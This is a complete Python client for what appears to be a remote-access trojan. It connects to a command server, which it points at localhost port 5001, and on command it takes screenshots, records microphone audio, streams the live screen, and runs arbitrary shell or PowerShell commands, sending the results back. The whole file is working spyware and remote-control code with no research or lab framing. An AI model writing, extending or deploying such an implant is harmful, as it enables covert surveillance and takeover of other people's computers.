import socket
import json
import base64
import io,os
import subprocess
import time
import cv2
import numpy as np
import sounddevice as sd
import soundfile as sf
import pyautogui
from datetime import datetime
SERVER_HOST = "127.0.0.1"   
SERVER_PORT = 5001

def log(msg):
    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] {msg}")

def send_json(sock, obj):
    """Send JSON object with 4-byte big-endian length prefix."""
    data = json.dumps(obj).encode('utf-8')
    sock.sendall(len(data).to_bytes(4, 'big'))
    sock.sendall(data)

def recv_all(sock, n):
    """Receive exactly n bytes or return None on EOF."""
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def handle_screenshot():
    """Capture a screenshot and return base64 PNG."""
    img = pyautogui.screenshot()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    encoded = base64.b64encode(buf.getvalue()).decode('utf-8')
    return {"command": "screenshot", "status": "ok", "data_base64": encoded}

def handle_record_audio(duration=5, samplerate=44100):
    """Record microphone input and return as base64 WAV."""
    log(f"Recording audio for {duration}s ...")
    audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=1, dtype='int16')
    sd.wait()
    buf = io.BytesIO()
    sf.write(buf, audio, samplerate, format='WAV')
    encoded = base64.b64encode(buf.getvalue()).decode('utf-8')
    return {"command": "record_audio", "status": "ok", "audio_base64": encoded}

def handle_live_screen(sock, duration=5):
    """Stream live screen frames to server."""
    send_json(sock, {"command": "live_screen", "status": "ok", "note": "stream starting"})
    end_time = time.time() + duration
    while time.time() < end_time:
        frame = np.array(pyautogui.screenshot())
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        _, encoded = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
        data = encoded.tobytes()
        sock.sendall(len(data).to_bytes(4, 'big'))
        sock.sendall(data)
        time.sleep(0.1)
    log("Live stream finished.")

def handle_powershell(sock, cmd):
   
    current_path = os.getcwd()

    if cmd.startswith("cd "):
        try:
            new_dir = cmd[3:].strip()
            if not new_dir:
                new_dir = os.path.expanduser("~")
            os.chdir(new_dir)
            current_path = os.getcwd()
            result = f"Changed directory to: {current_path}\n"
        except Exception as e:
            result = f"Error changing directory: {e}\n"
    elif cmd.lower() in ["exit", "quit", "logout"]:
        result = "Exited remote PowerShell session.\n"
    else:
        try:
            process = subprocess.run(
                cmd,
                shell=True,
                cwd=current_path,
                text=True,
                capture_output=True
            )
            result = process.stdout if process.stdout else process.stderr
        except Exception as e:
            result = f"Error executing command: {e}\n"

    # Send result back to server
    resp = {
        "command": "powershell",
        "status": "ok",
        "output": result,
        "cwd": os.getcwd()
    }
    send_json(sock, resp)

def client_loop():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        log(f"try Connecting to {SERVER_HOST}:{SERVER_PORT} ...")
        sock.connect((SERVER_HOST, SERVER_PORT))
        log("Connected to server.")
        while True:
            hdr = recv_all(sock, 4)
            if not hdr:
                break
            length = int.from_bytes(hdr, 'big')
            data = recv_all(sock, length)
            if not data:
                break

            try:
                cmd = json.loads(data.decode('utf-8'))
            except Exception as e:
                log(f"Bad JSON: {e}")
                continue

            command = cmd.get("command")
            log(f"Received command: {command}")

            try:
                if command == "screenshot":
                    resp = handle_screenshot()
                    send_json(sock, resp)

                elif command == "record_audio":
                    dur = int(cmd.get("duration", 5))
                    resp = handle_record_audio(dur)
                    send_json(sock, resp)

                elif command == "live_screen":
                    dur = int(cmd.get("duration", 5))
                    handle_live_screen(sock, dur)
                elif command == "powershell":
                    cmdline = cmd.get("cmd", "")
                    handle_powershell(sock, cmdline)

                else:
                    send_json(sock, {"command": command, "status": "unknown_command"})

            except Exception as e:
                log(f"Error executing {command}: {e}")
                send_json(sock, {"command": command, "status": f"error: {e}"})

    except Exception as e:
        log(f"Connection failed: {e}")
    finally:
        sock.close()
        log("Disconnected.")
if __name__ == "__main__":
    client_loop()
